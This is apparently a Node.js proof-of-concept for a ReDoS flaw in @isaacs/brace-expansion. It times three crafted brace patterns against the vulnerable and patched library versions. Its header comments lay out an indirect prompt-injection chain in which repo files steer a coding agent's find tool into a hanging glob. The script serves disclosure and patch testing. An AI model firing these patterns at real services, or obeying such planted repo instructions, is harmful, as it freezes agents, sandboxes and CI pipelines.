// POC 3: @isaacs/brace-expansion <= 5.0.0 ReDoS
// Advisory: GHSA-7h2j-956f-4vf2
// Impact: Crafted brace pattern causes catastrophic backtracking (Regular
// Expression Denial of Service), freezing the Node.js event loop.
// Transitive dep: glob -> minimatch -> @isaacs/brace-expansion.
//
// ATTACK CHAIN:
// 1. The coding agent's find tool (packages/coding-agent/src/core/tools/find.ts)
//    imports globSync from "glob". While the default path uses `fd`, custom
//    FindOperations can use globSync with LLM-controlled patterns.
// 2. The LLM controls the `pattern` argument via tool_call. No content
//    filtering is done — only JSON schema validation (type=string).
// 3. A pattern with exponential brace expansion (e.g., 25x "{a,b}") causes
//    brace-expansion to generate 2^25 = 33 million strings internally.
// 4. The event loop freezes for seconds or minutes, making the agent
//    completely unresponsive.
//
// REAL-WORLD SCENARIO:
// - Indirect prompt injection: A malicious .gitignore, package.json, or
//   README in a cloned repo contains instructions like "search for files
//   matching {a,b}{a,b}{a,b}...". The agent follows the instruction, and
//   the find tool hangs the process.
// - Sandboxed agent: In a Docker sandbox (like mom/sandbox.ts), bash may
//   be restricted but find/grep are allowed. An attacker uses the find
//   tool's glob pattern to DoS the sandbox, consuming CPU and blocking
//   all other operations.
// - CI/CD: An agent running in a CI pipeline processes a PR containing
//   a crafted glob pattern. The pipeline hangs until timeout, blocking
//   deployments.

import { createRequire } from "module";
import { Worker, isMainThread, parentPort, workerData } from "worker_threads";
import { fileURLToPath } from "url";

const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BOLD = "\x1b[1m";
const DIM = "\x1b[2m";
const RESET = "\x1b[0m";

const TIMEOUT_MS = 5000;

// Crafted patterns that trigger catastrophic backtracking in vulnerable versions
const maliciousPatterns = [
  {
    name: "Nested brace repetition",
    // Deeply nested alternation triggers exponential backtracking
    pattern: "{" + "a{b,".repeat(25) + "c" + "}".repeat(25) + "}",
  },
  {
    name: "Exponential brace expansion",
    // Many comma-separated nested groups
    pattern: "{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}",
  },
  {
    name: "Deep alternation nesting",
    pattern: "{" + "{,".repeat(20) + "x" + "}".repeat(20) + "}",
  },
];

const safePattern = "{a,b,c}";

if (!isMainThread) {
  // Worker thread: run brace expansion with timeout
  const { modulePath, pattern } = workerData;
  const require = createRequire(import.meta.url);
  const mod = require(modulePath);

  try {
    const start = performance.now();
    const result = mod.expand(pattern);
    const elapsed = performance.now() - start;
    parentPort.postMessage({ status: "ok", elapsed, resultCount: result.length });
  } catch (e) {
    parentPort.postMessage({ status: "error", message: e.message });
  }
} else {
  // Main thread
  async function testExpansion(modulePath, pattern) {
    return new Promise((resolve) => {
      const worker = new Worker(fileURLToPath(import.meta.url), {
        workerData: { modulePath, pattern },
      });

      const timeout = setTimeout(() => {
        worker.terminate();
        resolve({ status: "timeout", elapsed: TIMEOUT_MS });
      }, TIMEOUT_MS);

      worker.on("message", (msg) => {
        clearTimeout(timeout);
        resolve(msg);
      });

      worker.on("error", (err) => {
        clearTimeout(timeout);
        resolve({ status: "error", message: err.message });
      });

      worker.on("exit", (code) => {
        clearTimeout(timeout);
        if (code !== 0) {
          resolve({ status: "crash", message: `Worker exited with code ${code}` });
        }
      });
    });
  }

  console.log(`\n${BOLD}=== POC 3: @isaacs/brace-expansion ReDoS ===${RESET}`);
  console.log(`${YELLOW}Advisory: GHSA-7h2j-956f-4vf2${RESET}`);
  console.log(`${YELLOW}Dep chain: glob -> minimatch -> @isaacs/brace-expansion${RESET}`);
  console.log(`${YELLOW}Attack vector: LLM-controlled glob pattern in find tool${RESET}`);
  console.log(`${YELLOW}Impact: Event loop freeze — agent completely unresponsive${RESET}`);
  console.log(`${YELLOW}Timeout: ${TIMEOUT_MS}ms per test${RESET}\n`);

  console.log(`${DIM}  Real-world attack chain:${RESET}`);
  console.log(`${DIM}  1. Attacker places malicious instructions in a repo file (README, .gitignore)${RESET}`);
  console.log(`${DIM}  2. Agent reads file, LLM emits find tool_call with crafted brace pattern${RESET}`);
  console.log(`${DIM}  3. Pattern like "{a,b}" repeated 25x = 2^25 possible expansions${RESET}`);
  console.log(`${DIM}  4. brace-expansion regex engine backtracks exponentially${RESET}`);
  console.log(`${DIM}  5. Node.js event loop frozen — agent hangs, CI pipeline stalls${RESET}\n`);

  let exitCode = 0;
  const vulnModule = "/app/vulnerable/node_modules/@isaacs/brace-expansion/dist/commonjs/index.js";
  const patchedModule = "/app/patched/node_modules/@isaacs/brace-expansion/dist/commonjs/index.js";

  // --- VULNERABLE ---
  console.log(`${BOLD}--- Vulnerable version (@isaacs/brace-expansion 5.0.0) ---${RESET}`);

  // Safe pattern first
  const safeResult = await testExpansion(vulnModule, safePattern);
  if (safeResult.status === "ok") {
    console.log(`  Safe input "${safePattern}": ${GREEN}${safeResult.resultCount} results in ${safeResult.elapsed.toFixed(1)}ms${RESET}`);
  }

  for (const { name, pattern } of maliciousPatterns) {
    const result = await testExpansion(vulnModule, pattern);
    if (result.status === "timeout") {
      console.log(`  ${RED}[VULNERABLE]${RESET} ${name}: timed out after ${TIMEOUT_MS}ms (ReDoS confirmed)`);
      exitCode = 1;
    } else if (result.status === "ok" && result.elapsed > 1000) {
      console.log(`  ${RED}[VULNERABLE]${RESET} ${name}: took ${result.elapsed.toFixed(0)}ms (excessive)`);
      exitCode = 1;
    } else if (result.status === "ok") {
      console.log(`  ${YELLOW}[OK]${RESET} ${name}: ${result.resultCount} results in ${result.elapsed.toFixed(1)}ms`);
    } else {
      console.log(`  ${YELLOW}[${result.status.toUpperCase()}]${RESET} ${name}: ${result.message || "unknown"}`);
    }
  }

  // --- PATCHED ---
  console.log(`\n${BOLD}--- Patched version (@isaacs/brace-expansion 5.0.1) ---${RESET}`);

  const safePatchedResult = await testExpansion(patchedModule, safePattern);
  if (safePatchedResult.status === "ok") {
    console.log(`  Safe input "${safePattern}": ${GREEN}${safePatchedResult.resultCount} results in ${safePatchedResult.elapsed.toFixed(1)}ms${RESET}`);
  }

  for (const { name, pattern } of maliciousPatterns) {
    const result = await testExpansion(patchedModule, pattern);
    if (result.status === "timeout") {
      console.log(`  ${RED}[STILL VULNERABLE]${RESET} ${name}: timed out after ${TIMEOUT_MS}ms`);
    } else if (result.status === "ok" && result.elapsed > 1000) {
      console.log(`  ${YELLOW}[SLOW]${RESET} ${name}: ${result.elapsed.toFixed(0)}ms`);
    } else if (result.status === "ok") {
      console.log(`  ${GREEN}[PATCHED]${RESET} ${name}: ${result.resultCount} results in ${result.elapsed.toFixed(1)}ms`);
    } else if (result.status === "error") {
      console.log(`  ${GREEN}[PATCHED]${RESET} ${name}: rejected with error (${result.message.substring(0, 80)})`);
    } else {
      console.log(`  ${YELLOW}[${result.status.toUpperCase()}]${RESET} ${name}: ${result.message || "unknown"}`);
    }
  }

  console.log();
  process.exit(exitCode);
}
